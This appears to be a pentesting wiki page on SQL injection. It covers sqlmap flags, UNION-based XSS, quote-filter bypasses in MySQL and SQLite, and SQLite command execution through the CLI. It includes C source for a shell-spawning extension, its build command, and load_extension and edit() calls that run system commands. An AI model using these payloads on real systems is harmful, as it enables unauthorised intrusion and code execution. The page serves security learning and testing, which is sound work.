---
description: >-
  An infamous and simple attack where code is injected where data should be,
  rewriting the SQL Query
---

# SQL Injection

## SQLMap

{% embed url="https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap" %}

You can run a raw request through `sqlmap` with cookies and POST to find any injection:

```shell-session
$ sqlmap -r r.txt --batch
```

* `--level=5` tests more inputs, like HTTP headers
* `--risk=3` tests more injection payloads

### XSS/SQLi through SQL Injection

{% embed url="https://jorianwoltjer.com/blog/post/hacking/intigriti-xss-challenge/intigriti-july-xss-challenge-0722" %}
Writeup showing XSS through a Second-Order injection (3-in-one)
{% endembed %}

Use `UNION SELECT` statements to alter the returned content on the site, with an XSS payload for example.

{% hint style="info" %}
Also try 'Second-Order' injection, by doing another injection inside of your `UNION` content if not all values can be altered (see the writeup above)
{% endhint %}

### Filter Bypass

Some scenarios where you can bypass character limits using functions or special syntax. \
**`+`** means supported in more than just the mentioned DB backend.

* Quotes (`'` & `"`) like `"j0r1an"`:&#x20;
  * Use `0x6a307231616e` in **MySQL**: [CyberChef](https://gchq.github.io/CyberChef/#recipe=To\_Hex\('None',0\)Find\_/\_Replace\(%7B'option':'Regex','string':'.\*'%7D,'0x$%26',false,false,false,false\)\&input=ajByMWFu)
  * Use [`char(106,48,114,49,97,110)`](https://www.sqlite.org/lang\_corefunc.html#char) in **SQLite+**: [CyberChef](https://gchq.github.io/CyberChef/#recipe=To\_Decimal\('Comma',false\)Find\_/\_Replace\(%7B'option':'Regex','string':'.\*'%7D,'char\($%26\)',false,false,true,true\)\&input=ajByMWFu)

## SQLite

Tricks specific to the SQLite database backend.

### RCE through CLI

While looking through the documentation, you might notice functions that seem to have the ability to run arbitrary code on the system. The catch is that these methods are only possible using the `sqlite3` CLI tool by default, only with some very specific configuration will they be available through a normal library that uses the safer C-API behind the scenes.&#x20;

#### [`load_extension()`](https://www.sqlite.org/lang\_corefunc.html#load\_extension)

SQLite uses the C-API for all the heavy work, and the CLI as well as libraries are just wrappers over this. The `load_extension()` function is special as it can only be called after calling the `enable_load_extension()` function from the C-API, which is not available in SQL syntax. Fortunately, the **CLI enables this automatically** which means that if we are able to inject code into such a query, we can load extensions.&#x20;

These extensions are simply compiled C code in the form of `.so` files, with an init function:

<pre class="language-c" data-title="extension.c"><code class="lang-c">#include &#x3C;sqlite3ext.h>
SQLITE_EXTENSION_INIT1

#include &#x3C;stdlib.h>
#include &#x3C;unistd.h>

int sqlite3_extension_init(sqlite3 *db, char **pzErrMsg, const sqlite3_api_routines *pApi) {
  SQLITE_EXTENSION_INIT2(pApi);

<strong>  execve("/bin/sh", NULL, NULL);  // Spawn an interactive shell
</strong>
  return SQLITE_OK;
}
</code></pre>

```shell-session
$ gcc -s -g -fPIC -shared extension.c -o extension.so
```

Then from inside a CLI query, we can call the function with a path to the compiled extension:

<pre class="language-sql"><code class="lang-sql"><strong>sqlite> select load_extension('./extension');
</strong>$ id
uid=1001(user) gid=1001(user) groups=1001(user)
</code></pre>

#### [`edit()`](https://www.sqlite.org/cli.html#the\_edit\_sql\_function)

The CLI also includes an extra special function used for editing data interactively, which allows its 2nd argument to decide what command to run! It is very straightforward to exploit:

<pre class="language-sql"><code class="lang-sql"><strong>sqlite> select edit(1,'id;');
</strong>uid=1001(user) gid=1001(user) groups=1001(user)
sh: 1: temp9385525e2ea5301f: not found
Error: EDITOR returned non-zero
</code></pre>
